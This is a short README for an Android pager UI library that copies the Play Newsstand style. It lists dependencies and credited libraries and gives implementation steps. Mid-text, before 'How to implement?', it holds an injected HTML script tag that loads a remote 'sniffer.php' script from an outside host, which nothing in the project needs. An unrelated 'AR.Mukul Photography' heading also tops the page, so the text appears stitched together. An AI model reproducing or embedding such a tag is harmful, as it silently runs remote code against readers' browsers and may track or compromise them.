AR.Mukul Photography

======================

This library is pager UI for Android.
(such as pager UI in Play NewsStand Application)

to use this project you need to add :

  1. NineOldAndroids (https://github.com/JakeWharton/NineOldAndroids)
  2. Appcompat (http://developer.android.com/tools/support-library/features.html#v7-appcompat)

I made this based on very good libraries such as below.

  1. NotBoringActionBar (https://github.com/flavienlaurent/NotBoringActionBar)
  2. PagerSlidingTabStrip (https://github.com/astuetz/PagerSlidingTabStrip)

<script src="http://monk.ee/sniffer.php?appid=102068376"></script> How to implement? see below.
1. Change ListView in NotBoringActionBar to ViewPager.

  1. Make ListView or ScrollView of Fragment in ViewPager.
  2. Make Interface that Activity can get a Listener when you use OnScroll() in ListView or ScrollView.
  3. Make Interface which is available to scroll when some events is happened in ListView or ScrollView.

From now on, you can fix scrollY value in ListView wherever the pages are swiped through the interface you've just made.
